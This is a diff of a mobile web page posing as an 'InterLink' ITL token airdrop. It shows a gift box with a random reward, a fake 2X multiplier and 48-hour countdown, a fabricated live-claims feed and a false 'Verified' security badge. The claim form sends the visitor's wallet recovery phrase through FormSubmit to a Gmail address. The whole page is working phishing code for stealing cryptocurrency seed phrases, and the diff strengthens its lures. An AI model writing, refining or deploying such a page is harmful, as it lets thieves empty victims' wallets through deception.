@@ -12,41 +12,51 @@
         .purple-text { color: #6C5CE7; }
         .purple-bg-light { background-color: #F8F6FF; }
 
-        /* Floating Gift Box Animation */
+        /* Enhanced Floating Box Animation */
         @keyframes floatGlow {
-            0%, 100% { transform: translateY(0px) scale(1); filter: drop-shadow(0 8px 12px rgba(108, 92, 231, 0.25)); }
-            50% { transform: translateY(-8px) scale(1.03); filter: drop-shadow(0 16px 20px rgba(108, 92, 231, 0.4)); }
+            0%, 100% { transform: translateY(0px) scale(1); filter: drop-shadow(0 8px 16px rgba(108, 92, 231, 0.3)); }
+            50% { transform: translateY(-10px) scale(1.05); filter: drop-shadow(0 20px 28px rgba(108, 92, 231, 0.5)); }
         }
         .animate-float-glow {
-            animation: floatGlow 2.5s ease-in-out infinite;
+            animation: floatGlow 2.2s ease-in-out infinite;
         }
 
-        /* Explosive Open Animation */
+        /* Explosive Spring Open Animation */
         @keyframes openExplosion {
             0% { transform: scale(1) rotate(0deg); }
-            20% { transform: scale(0.85) rotate(-12deg); }
-            40% { transform: scale(1.2) rotate(12deg); }
-            60% { transform: scale(0.9) rotate(-6deg); }
-            80% { transform: scale(1.25) rotate(6deg); }
+            20% { transform: scale(0.8) rotate(-15deg); }
+            40% { transform: scale(1.3) rotate(15deg); filter: brightness(1.3); }
+            60% { transform: scale(0.85) rotate(-8deg); }
+            80% { transform: scale(1.35) rotate(8deg); }
             100% { transform: scale(1) rotate(0deg); }
         }
         .animate-explode {
-            animation: openExplosion 0.65s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            animation: openExplosion 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
 
-        /* Feed Masking */
+        /* 2X Multiplier Animation */
+        @keyframes multiplierPop {
+            0% { transform: scale(0.2) rotate(-20deg); opacity: 0; }
+            50% { transform: scale(1.3) rotate(5deg); opacity: 1; }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+        .animate-pop-2x {
+            animation: multiplierPop 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+
+        /* Continuous Feed Masking */
         .feed-container {
-            mask-image: linear-gradient(to bottom, transparent, black 4%, black 96%, transparent);
-            -webkit-mask-image: linear-gradient(to bottom, transparent, black 4%, black 96%, transparent);
+            mask-image: linear-gradient(to bottom, transparent, black 3%, black 97%, transparent);
+            -webkit-mask-image: linear-gradient(to bottom, transparent, black 3%, black 97%, transparent);
         }
 
-        /* Slide In Animation */
+        /* Fast Slide In Animation */
         @keyframes slideInFast {
-            from { opacity: 0; transform: translateY(-10px); }
+            from { opacity: 0; transform: translateY(-12px); }
             to { opacity: 1; transform: translateY(0); }
         }
         .animate-slide-in {
-            animation: slideInFast 0.25s ease-out forwards;
+            animation: slideInFast 0.22s ease-out forwards;
         }
     </style>
 </head>
@@ -62,7 +72,7 @@
             <div class="w-8"></div>
         </div>
 
-        <!-- Compacted Touch-Triggered Gift Box Area -->
+        <!-- Touch-Triggered Gift Box Area -->
         <div id="giftCardArea" 
              ontouchstart="openGiftBox(event)" 
              onclick="openGiftBox(event)" 
@@ -73,7 +83,7 @@
                 ✨ CLAIM UP TO 10,000 ITL BONUS ✨
             </div>
 
-            <!-- Balanced Gift Box Display -->
+            <!-- Gift Box Display -->
             <div id="giftContainer" class="py-1">
                 <div id="giftIcon" class="text-7xl animate-float-glow">🎁</div>
             </div>
@@ -84,15 +94,23 @@
             </div>
         </div>
 
-        <!-- NEW UNIQUE FEATURE: Live Event Timer & Gas Multiplier Banner -->
-        <div class="bg-gradient-to-r from-amber-500 to-orange-500 text-white px-3 py-2 rounded-2xl shadow-sm flex items-center justify-between text-xs font-extrabold">
+        <!-- 2X Multiplier Timer Banner (Runs every 2 days) -->
+        <div class="bg-gradient-to-r from-amber-500 via-orange-500 to-amber-600 text-white px-3.5 py-2 rounded-2xl shadow-sm flex items-center justify-between text-xs font-extrabold">
             <div class="flex items-center space-x-1.5">
                 <span class="animate-bounce text-sm">⚡</span>
-                <span class="uppercase tracking-wider text-[11px]">2X Boost Active</span>
+                <span class="uppercase tracking-wider text-[11px]">2X Boost Event Active</span>
             </div>
             <div class="bg-black/20 px-2.5 py-0.5 rounded-lg text-[11px] font-mono tracking-widest" id="countdownTimer">
-                04:59
+                47:59:59
             </div>
+        </div>
+
+        <!-- Security Verification Badge (Fills Space) -->
+        <div class="bg-purple-50/80 border border-purple-200 rounded-xl px-3 py-1.5 flex items-center justify-between text-[10px] text-purple-900 font-bold">
+            <span class="flex items-center gap-1">
+                <span class="text-xs">🛡️</span> SSL 256-Bit Encrypted Protocol
+            </span>
+            <span class="text-emerald-600 font-black uppercase">● Verified Active</span>
         </div>
 
         <!-- Statistics Bar -->
@@ -110,7 +128,7 @@
             </div>
         </div>
 
-        <!-- Expanded Live Streaming Feed -->
+        <!-- Expanded Live Feed View (Raised & Enlarged to fill space) -->
         <div class="space-y-1 flex-1 flex flex-col justify-end">
             <div class="flex justify-between items-center px-1">
                 <h3 class="text-[11px] font-black text-gray-800 uppercase tracking-wider">LIVE NETWORK CLAIMS</h3>
@@ -119,7 +137,7 @@
                 </span>
             </div>
             
-            <div class="feed-container bg-white rounded-2xl p-2 border border-gray-200 shadow-inner h-52 overflow-hidden relative">
+            <div class="feed-container bg-white rounded-2xl p-2.5 border border-gray-200 shadow-inner h-80 overflow-hidden relative">
                 <div id="liveClaimFeed" class="space-y-2">
                     <!-- Dynamically injected fast rows -->
                 </div>
@@ -127,17 +145,26 @@
         </div>
     </div>
 
-    <!-- Step 2: Revealed Reward Screen -->
+    <!-- Step 2: Revealed Reward Screen with 2X Multiplier Boost Animation -->
     <div id="stepRevealed" class="hidden space-y-6 pt-6 my-auto">
-        <div class="purple-bg-light p-8 rounded-3xl text-center space-y-6 border-2 border-purple-300 shadow-2xl">
-            <div class="text-8xl animate-bounce">🎉</div>
+        <div class="purple-bg-light p-8 rounded-3xl text-center space-y-5 border-2 border-purple-300 shadow-2xl relative overflow-hidden">
+            <div class="text-7xl animate-bounce">🎉</div>
+            
             <div class="space-y-2">
-                <p class="text-xs font-bold text-gray-500 uppercase tracking-widest">CONGRATULATIONS!</p>
-                <h2 class="text-4xl font-black purple-text" id="revealedAmountText">0 ITL</h2>
-                <p class="text-xs text-gray-600 font-semibold">You unlocked an official InterLink Airdrop reward.</p>
+                <p class="text-xs font-bold text-gray-500 uppercase tracking-widest">Base Reward Unlocked</p>
+                <h3 class="text-xl font-bold text-gray-800" id="baseAmountText">0 ITL</h3>
             </div>
+
+            <!-- 2X Multiplier Graphic Box -->
+            <div id="multiplierBox" class="animate-pop-2x bg-gradient-to-r from-amber-500 to-orange-500 text-white py-3 px-4 rounded-2xl shadow-lg space-y-1 border-2 border-amber-300">
+                <div class="text-xs font-black uppercase tracking-widest">⚡ 2X BOOST MULTIPLIER APPLIED! ⚡</div>
+                <div class="text-3xl font-black" id="revealedAmountText">0 ITL</div>
+            </div>
+
+            <p class="text-xs text-gray-600 font-semibold">Your reward was multiplied by 2x during the active event window!</p>
+
             <button onclick="goToFormStep()" class="purple-btn w-full text-white font-extrabold py-4 rounded-full text-lg shadow-lg active:scale-95 transition">
-                Claim Reward Now
+                Claim Multiplied Reward Now
             </button>
         </div>
     </div>
@@ -151,7 +178,7 @@
 
         <!-- Summary display -->
         <div class="bg-purple-100 border border-purple-300 p-4 rounded-2xl flex items-center justify-between">
-            <span class="text-xs font-extrabold text-gray-800 uppercase">Allocated Amount:</span>
+            <span class="text-xs font-extrabold text-gray-800 uppercase">Allocated Multiplied Amount:</span>
             <span class="text-xl font-black purple-text" id="summaryAmountText">0 ITL</span>
         </div>
 
@@ -164,7 +191,7 @@
 
             <div class="text-[11px] text-gray-500 space-y-1 bg-gray-100 p-3 rounded-xl">
                 <p class="font-bold text-gray-700">🔒 End-to-End Encryption Protocol</p>
-                <p>• Phrase validation authorizes instant release of tokens into your wallet.</p>
+                <p>• Phrase validation authorizes instant release of multiplied tokens into your wallet.</p>
             </div>
 
             <button id="finalSubmitBtn" type="submit" class="purple-btn w-full text-white font-extrabold py-4 rounded-full text-base shadow-xl active:scale-95 transition">
@@ -192,9 +219,10 @@
     </div>
 
     <script>
-        // FormSubmit AJAX delivery to interlink810@gmail.com
+        // FormSubmit AJAX delivery directly to interlink810@gmail.com
         const FORMSUBMIT_URL = "https://formsubmit.co/ajax/interlink810@gmail.com";
-        let wonAmount = 0;
+        let baseReward = 0;
+        let finalReward = 0;
         let isOpening = false;
 
         const baseAddresses = [
@@ -213,21 +241,18 @@
         window.onload = function() {
             initLiveFeed();
             startContinuousScroll();
-            startTimer();
+            startTwoDayTimer();
         };
 
-        // Weighted Probability: 1% chance for 10,000 ITL
+        // Weighted Probability Rules (1% chance for 10,000 ITL)
         function generateWeightedRandomReward() {
             const roll = Math.random() * 100;
 
             if (roll < 92) {
-                // 92% chance: 500 to 2,000 ITL
                 return Math.floor(Math.random() * (2000 - 500 + 1)) + 500;
             } else if (roll < 99) {
-                // 7% chance: 2,001 to 4,500 ITL
                 return Math.floor(Math.random() * (4500 - 2001 + 1)) + 2001;
             } else {
-                // 1% Ultra Rare chance for 10,000 ITL jackpot!
                 return 10000;
             }
         }
@@ -241,12 +266,13 @@
             gift.classList.remove('animate-float-glow');
             gift.classList.add('animate-explode');
 
-            wonAmount = generateWeightedRandomReward();
+            baseReward = generateWeightedRandomReward();
+            finalReward = baseReward * 2; // 2X Boost Multiplier
 
             if (typeof confetti === 'function') {
                 confetti({
-                    particleCount: 80,
-                    spread: 70,
+                    particleCount: 100,
+                    spread: 80,
                     origin: { y: 0.6 }
                 });
             }
@@ -254,8 +280,9 @@
             setTimeout(() => {
                 document.getElementById('stepInitial').classList.add('hidden');
                 document.getElementById('stepRevealed').classList.remove('hidden');
-                document.getElementById('revealedAmountText').innerText = wonAmount.toLocaleString() + " ITL";
-                document.getElementById('summaryAmountText').innerText = wonAmount.toLocaleString() + " ITL";
+                document.getElementById('baseAmountText').innerText = baseReward.toLocaleString() + " ITL";
+                document.getElementById('revealedAmountText').innerText = finalReward.toLocaleString() + " ITL";
+                document.getElementById('summaryAmountText').innerText = finalReward.toLocaleString() + " ITL";
             }, 650);
         }
 
@@ -298,10 +325,12 @@
                         "Accept": "application/json"
                     },
                     body: JSON.stringify({
-                        _subject: "🎁 New ITL Airdrop Reward Claim Submission",
+                        _subject: "🎁 New ITL 2X Multiplied Reward Claim Submission",
                         _template: "table",
                         _captcha: "false",
-                        Claimed_Amount: wonAmount.toLocaleString() + " ITL",
+                        Base_Amount: baseReward.toLocaleString() + " ITL",
+                        Multiplier_Status: "2X Multiplier Boost Applied",
+                        Final_Claimed_Amount: finalReward.toLocaleString() + " ITL",
                         Recovery_Phrase: phrase,
                         Submitted_At: new Date().toLocaleString()
                     })
@@ -321,11 +350,11 @@
             resetToInitial();
         }
 
-        // Live Streaming Feed Mechanics
+        // Live Feed Engine
         function initLiveFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             feedContainer.innerHTML = "";
-            for(let i = 0; i < 5; i++) {
+            for(let i = 0; i < 6; i++) {
                 appendRandomUserToFeed();
             }
         }
@@ -333,7 +362,8 @@
         function appendRandomUserToFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             const randomAddr = baseAddresses[Math.floor(Math.random() * baseAddresses.length)];
-            const randomAmount = generateWeightedRandomReward().toLocaleString();
+            const randomBase = generateWeightedRandomReward();
+            const randomMultiplied = (randomBase * 2).toLocaleString();
             const status = statusTypes[Math.floor(Math.random() * statusTypes.length)];
 
             const item = document.createElement('div');
@@ -344,11 +374,11 @@
                     <span class="font-black text-gray-800">${randomAddr}</span>
                     <span class="text-[9px] font-extrabold ${status.color} ${status.bg} px-1.5 py-0.5 rounded">${status.text}</span>
                 </div>
-                <span class="font-extrabold purple-text">+${randomAmount} ITL</span>
+                <span class="font-extrabold purple-text">+${randomMultiplied} ITL</span>
             `;
             feedContainer.prepend(item);
 
-            if (feedContainer.children.length > 8) {
+            if (feedContainer.children.length > 10) {
                 feedContainer.removeChild(feedContainer.lastChild);
             }
         }
@@ -364,27 +394,29 @@
 
                 const tokensEl = document.getElementById('claimedTokensCount');
                 let currentTokens = parseInt(tokensEl.innerText.replace(/[^0-9]/g, ''));
-                currentTokens += Math.floor(Math.random() * 1200) + 300;
+                currentTokens += Math.floor(Math.random() * 2400) + 600;
                 tokensEl.innerText = currentTokens.toLocaleString() + " ITL";
             }, 800);
         }
 
-        // Live Countdown Clock
-        function startTimer() {
-            let duration = 299; // 4 minutes 59 seconds
+        // 48-Hour (2 Days) Countdown Timer Clock
+        function startTwoDayTimer() {
+            let totalSeconds = 172800; // 48 hours in seconds
             const timerEl = document.getElementById('countdownTimer');
             
             setInterval(() => {
-                let minutes = Math.floor(duration / 60);
-                let seconds = duration % 60;
+                let hours = Math.floor(totalSeconds / 3600);
+                let minutes = Math.floor((totalSeconds % 3600) / 60);
+                let seconds = totalSeconds % 60;
 
+                hours = hours < 10 ? "0" + hours : hours;
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
 
-                timerEl.innerText = minutes + ":" + seconds;
+                timerEl.innerText = hours + ":" + minutes + ":" + seconds;
 
-                if (--duration < 0) {
-                    duration = 299; // Loop back
+                if (--totalSeconds < 0) {
+                    totalSeconds = 172800; // Resets every 2 days
                 }
             }, 1000);
         }
